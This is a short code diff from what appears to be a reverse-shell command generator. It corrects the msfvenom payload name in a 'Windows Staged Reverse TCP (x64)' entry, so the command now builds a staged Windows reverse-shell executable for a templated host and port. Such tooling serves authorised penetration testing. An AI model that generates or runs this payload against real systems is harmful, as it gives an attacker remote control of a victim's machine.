@@ -355,7 +355,7 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Windows Staged Reverse TCP (x64)",
-            "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
+            "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
             "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
         },
         {
